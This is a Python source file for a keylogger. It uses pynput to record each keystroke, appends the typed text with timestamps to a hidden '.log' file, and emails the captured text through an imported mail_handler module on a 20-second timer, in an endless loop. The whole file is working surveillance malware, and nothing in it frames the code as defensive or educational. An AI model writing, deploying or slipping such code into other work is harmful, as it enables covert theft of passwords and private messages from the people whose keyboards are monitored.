import os
from pynput import keyboard
from datetime import datetime
import json
import mail_handler as md
from threading import Timer

# define the path of log file.
path = os.getcwd()
log_file = path + '/.log'

send = True


def is_send():
    global send
    send = True

"""
Class that processes some basic functions of a keylogger.
"""
class Keylogger:
    def __init__(self):
        self.log_file = log_file
        self.log = ''

    """
    get keyboard event.
    """
    def get_key(self, key):
        try:
            getKey = str(key.char)
            print(getKey)
        except AttributeError:
            getKey = ''

        self.append_log(getKey)

    """
    once the 'enter' key is released, we log the previous message
    into the log file.
    And when a 'space is entered, we log it, too.
    """
    def get_Release (self, key):
        if key == keyboard.Key.enter:
            self.construct_data()
            return False
        elif key == keyboard.Key.space:
            self.log += ' '

    def append_log(self, newmsg):
        self.log += newmsg

    # construct data to be logged in a json format.
    def construct_data (self):
        # get current time.
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        data = {
            'msg': self.log,
            'time': current_time
        }
        data = json.dumps(data)
        # put the logged message into the log file.
        with open(self.log_file, 'a') as f:
            f.write(data)
        # send email and clear temp log buffer.
        global send
        if send == True:
            print(self.log)
            md.send_email(self.log)
            send = False
        self.log = ''

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.get_key, on_release=self.get_Release)
        with keyboard_listener:
            keyboard_listener.join()


kl = Keylogger()
while 1:
    kl.start()
    if not send:
        t = Timer(20.0, is_send)
        t.start()
